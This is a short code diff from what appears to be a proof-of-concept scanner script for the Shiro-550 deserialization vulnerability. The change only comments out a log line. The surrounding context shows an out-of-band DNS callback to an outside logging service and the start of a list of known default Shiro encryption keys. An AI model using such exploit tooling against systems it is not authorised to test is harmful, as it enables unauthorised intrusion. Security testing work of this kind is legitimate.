@@ -38,7 +38,7 @@ class POC(Script):
         await self.get_url()
         if self.base_url:
             dns = self.ceye_dns_api(k='shiro550', t='dns')
-            logger.sysinfo(dns + ' ------- '+  self.base_url)
+            # logger.sysinfo(dns + ' ------- '+  self.base_url)
             async with ClientSession() as session:
                 keylist = [
                             'kPH+bIxk5D2deZiIxcaaaA==',
